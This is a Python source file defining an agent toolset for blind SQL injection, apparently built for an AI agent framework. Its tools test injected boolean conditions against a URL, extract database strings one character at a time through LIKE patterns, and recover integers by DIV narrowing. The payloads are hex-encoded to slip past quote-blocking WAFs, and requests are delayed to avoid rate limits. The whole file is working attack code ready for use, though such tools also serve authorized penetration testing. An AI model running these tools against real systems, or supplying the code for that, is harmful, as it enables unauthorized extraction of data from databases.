"""Blind SQL injection extraction toolkit for boolean/timing-based blind SQLi.

Provides character-by-character string extraction (LIKE narrowing), integer
extraction (DIV bisection), and single-condition testing through a configurable
boolean oracle. Supports hex-encoded payloads for WAF bypass.
"""

from __future__ import annotations

import asyncio
import json
import urllib.parse
from typing import Annotated

import httpx
from dreadnode.agents.tools import Toolset, tool_method
from pydantic import PrivateAttr


class BlindSQLiTools(Toolset):
    """Boolean and timing-based blind SQL injection extraction.

    Configure a boolean oracle (JSON field path + threshold) and extract
    data from injectable parameters using LIKE narrowing (strings) or
    DIV bisection (integers).
    """

    timeout: int = 30
    """HTTP request timeout in seconds."""
    delay: float = 0.3
    """Delay between requests in seconds to avoid rate limiting."""
    max_length: int = 80
    """Maximum string length to extract before stopping."""

    _client: httpx.AsyncClient | None = PrivateAttr(default=None)
    _request_count: int = PrivateAttr(default=0)

    def _ensure_client(self) -> httpx.AsyncClient:
        """Ensure persistent HTTP client exists."""
        if self._client is None:
            self._client = httpx.AsyncClient(timeout=self.timeout)
        return self._client

    @tool_method(name="sqli_test_condition", catch=True)
    async def test_condition(
        self,
        url: Annotated[str, "Full URL with the injectable parameter value replaced by {PAYLOAD}"],
        payload_template: Annotated[
            str,
            "SQL payload template with {condition} placeholder, "
            "e.g. \"value'+CASE WHEN {condition} THEN 0 ELSE 1 END+'\"",
        ],
        condition: Annotated[str, "SQL condition to test, e.g. '1=1' or '@@version LIKE 0x38%'"],
        oracle_field: Annotated[
            str,
            "Dot-notation JSON field path that signals TRUE when >= threshold, e.g. 'paging.total'",
        ],
        oracle_threshold: Annotated[int, "Minimum value of oracle_field that indicates TRUE"] = 1,
        method: Annotated[str, "HTTP method"] = "GET",
        headers: dict[str, str] | None = None,
        auth_header: Annotated[str | None, "Authorization header value"] = None,
    ) -> str:
        """Test a single boolean condition via blind SQLi oracle.

        Builds the injection payload from the template and condition,
        sends the request, and evaluates the oracle field to determine
        TRUE or FALSE.

        Returns a human-readable result showing the condition tested
        and whether it evaluated to TRUE or FALSE.
        """
        self._request_count += 1
        payload = payload_template.format(condition=condition)
        target_url = url.replace("{PAYLOAD}", urllib.parse.quote(payload, safe=""))

        req_headers = dict(headers or {})
        if auth_header:
            req_headers["Authorization"] = auth_header

        client = self._ensure_client()

        try:
            response = await client.request(method.upper(), target_url, headers=req_headers)
            data = response.json()

            val = _resolve_field(data, oracle_field)
            if val is None:
                return f"ORACLE ERROR: field '{oracle_field}' not found in response\nCondition: {condition}\nRequests: {self._request_count}"

            is_true = int(val) >= oracle_threshold
            return (
                f"Condition: {condition}\n"
                f"Result: {'TRUE' if is_true else 'FALSE'}\n"
                f"Oracle: {oracle_field} = {val} (threshold: {oracle_threshold})\n"
                f"Requests: {self._request_count}"
            )

        except httpx.TimeoutException:
            return (
                f"TIMEOUT after {self.timeout}s (may indicate TRUE for time-based oracles)\n"
                f"Condition: {condition}\n"
                f"Requests: {self._request_count}"
            )
        except (json.JSONDecodeError, KeyError, TypeError, ValueError) as e:
            return f"ORACLE ERROR: {e}\nCondition: {condition}\nRequests: {self._request_count}"

    @tool_method(name="sqli_extract_string", catch=True)
    async def extract_string(
        self,
        url: Annotated[str, "Full URL with {PAYLOAD} placeholder for the injectable parameter"],
        payload_template: Annotated[str, "SQL payload template with {condition} placeholder"],
        expression: Annotated[str, "SQL expression to extract, e.g. '@@version' or 'CURRENT_USER'"],
        oracle_field: Annotated[str, "Dot-notation JSON field for boolean oracle"],
        oracle_threshold: Annotated[int, "Minimum oracle value for TRUE"] = 1,
        known_values: Annotated[
            str | None, "Comma-separated known values to try first (saves requests)"
        ] = None,
        charset: Annotated[
            str | None, "Character set to search (default: alphanumeric + common symbols)"
        ] = None,
        hex_encode: Annotated[
            bool, "Use 0x hex encoding for string comparisons (bypasses quote-blocking WAFs)"
        ] = True,
        method: Annotated[str, "HTTP method"] = "GET",
        headers: dict[str, str] | None = None,
        auth_header: Annotated[str | None, "Authorization header value"] = None,
    ) -> str:
        """Extract a string value character-by-character via boolean blind SQLi.

        Uses LIKE with hex-encoded patterns to extract values one character
        at a time. Tries known_values first as an optimization.

        Returns the extracted value with match type (exact, prefix, or max length).
        """
        if charset is None:
            # '.' before '_' because '_' is a LIKE wildcard and must be tested carefully
            charset = "abcdefghijklmnopqrstuvwxyz0123456789-./ABCDEFGHIJKLMNOPQRSTUVWXYZ:_ @"

        start_count = self._request_count

        # Try known values first (exact match, saves many requests)
        if known_values:
            for val in known_values.split(","):
                val = val.strip()
                if hex_encode:
                    cond = f"{expression}=0x{val.encode().hex()}"
                else:
                    cond = f"{expression}='{val}'"

                await asyncio.sleep(self.delay)
                result = await self._check_condition(
                    url, payload_template, cond, oracle_field, oracle_threshold,
                    method, headers, auth_header,
                )
                if result:
                    return (
                        f"Extracted: {expression} = {val}\n"
                        f"Match: exact (known value)\n"
                        f"Requests: {self._request_count - start_count}"
                    )

        # Character-by-character extraction via LIKE
        current = ""
        for _ in range(self.max_length):
            found = False
            for ch in charset:
                await asyncio.sleep(self.delay)
                pattern = current + ch + "%"
                if hex_encode:
                    cond = f"{expression} LIKE 0x{pattern.encode().hex()}"
                else:
                    cond = f"{expression} LIKE '{pattern}'"

                result = await self._check_condition(
                    url, payload_template, cond, oracle_field, oracle_threshold,
                    method, headers, auth_header,
                )
                if result:
                    current += ch
                    found = True
                    break

            if not found:
                # Verify with exact match
                await asyncio.sleep(self.delay)
                if hex_encode:
                    cond = f"{expression}=0x{current.encode().hex()}"
                else:
                    cond = f"{expression}='{current}'"
                exact = await self._check_condition(
                    url, payload_template, cond, oracle_field, oracle_threshold,
                    method, headers, auth_header,
                )
                match_type = "exact" if exact else "prefix"
                return (
                    f"Extracted: {expression} = {current}\n"
                    f"Match: {match_type}\n"
                    f"Requests: {self._request_count - start_count}"
                )

        return (
            f"Extracted: {expression} = {current}\n"
            f"Match: max length reached\n"
            f"Requests: {self._request_count - start_count}"
        )

    @tool_method(name="sqli_extract_int", catch=True)
    async def extract_int(
        self,
        url: Annotated[str, "Full URL with {PAYLOAD} placeholder"],
        payload_template: Annotated[str, "SQL payload template with {condition} placeholder"],
        expression: Annotated[str, "SQL expression to extract, e.g. '@@port' or 'LENGTH(user())'"],
        oracle_field: Annotated[str, "Dot-notation JSON field for boolean oracle"],
        oracle_threshold: Annotated[int, "Minimum oracle value for TRUE"] = 1,
        low: Annotated[int, "Minimum expected value"] = 0,
        high: Annotated[int, "Maximum expected value"] = 65535,
        method: Annotated[str, "HTTP method"] = "GET",
        headers: dict[str, str] | None = None,
        auth_header: Annotated[str | None, "Authorization header value"] = None,
    ) -> str:
        """Extract an integer value via DIV narrowing (30-96 requests).

        Narrows the range progressively: thousands, hundreds, tens, exact.
        Much faster than character-by-character for numeric values.
        """
        start_count = self._request_count

        # Narrow by thousands
        for k in range(high // 1000 + 1):
            await asyncio.sleep(self.delay)
            result = await self._check_condition(
                url, payload_template, f"{expression} DIV 1000={k}",
                oracle_field, oracle_threshold, method, headers, auth_header,
            )
            if result:
                low, high = k * 1000, (k + 1) * 1000 - 1
                break

        # Narrow by hundreds
        for k in range(low // 100, high // 100 + 1):
            await asyncio.sleep(self.delay)
            result = await self._check_condition(
                url, payload_template, f"{expression} DIV 100={k}",
                oracle_field, oracle_threshold, method, headers, auth_header,
            )
            if result:
                low, high = k * 100, (k + 1) * 100 - 1
                break

        # Narrow by tens
        for k in range(low // 10, high // 10 + 1):
            await asyncio.sleep(self.delay)
            result = await self._check_condition(
                url, payload_template, f"{expression} DIV 10={k}",
                oracle_field, oracle_threshold, method, headers, auth_header,
            )
            if result:
                low, high = k * 10, (k + 1) * 10 - 1
                break

        # Exact value
        for v in range(low, high + 1):
            await asyncio.sleep(self.delay)
            result = await self._check_condition(
                url, payload_template, f"{expression}={v}",
                oracle_field, oracle_threshold, method, headers, auth_header,
            )
            if result:
                return (
                    f"Extracted: {expression} = {v}\n"
                    f"Match: exact\n"
                    f"Requests: {self._request_count - start_count}"
                )

        return (
            f"Extracted: {expression} = None (not found in range)\n"
            f"Requests: {self._request_count - start_count}"
        )

    @tool_method(name="sqli_get_request_count", catch=True)
    async def get_request_count(self) -> str:
        """Get the total number of SQLi extraction requests sent this session."""
        return f"Total SQLi requests: {self._request_count}"

    @tool_method(name="sqli_reset", catch=True)
    async def reset(self) -> str:
        """Reset the request counter and HTTP client.

        Use between extraction targets or when switching injection points.
        """
        self._request_count = 0
        if self._client is not None:
            await self._client.aclose()
            self._client = None
        return "SQLi extractor reset. Request count: 0."

    async def _check_condition(
        self,
        url: str,
        payload_template: str,
        condition: str,
        oracle_field: str,
        oracle_threshold: int,
        method: str,
        headers: dict[str, str] | None,
        auth_header: str | None,
    ) -> bool:
        """Send request and return boolean oracle result."""
        self._request_count += 1
        payload = payload_template.format(condition=condition)
        target_url = url.replace("{PAYLOAD}", urllib.parse.quote(payload, safe=""))

        req_headers = dict(headers or {})
        if auth_header:
            req_headers["Authorization"] = auth_header

        client = self._ensure_client()

        try:
            response = await client.request(method.upper(), target_url, headers=req_headers)
            data = response.json()

            val = _resolve_field(data, oracle_field)
            if val is None:
                return False
            return int(val) >= oracle_threshold

        except (httpx.TimeoutException, json.JSONDecodeError, KeyError, TypeError, ValueError):
            return False


def _resolve_field(data: object, field_path: str) -> object | None:
    """Resolve a dot-notation field path in nested JSON data."""
    val = data
    for part in field_path.split("."):
        if isinstance(val, dict):
            if part not in val:
                return None
            val = val[part]
        elif isinstance(val, list) and part.isdigit():
            idx = int(part)
            if idx >= len(val):
                return None
            val = val[idx]
        else:
            return None
    return val
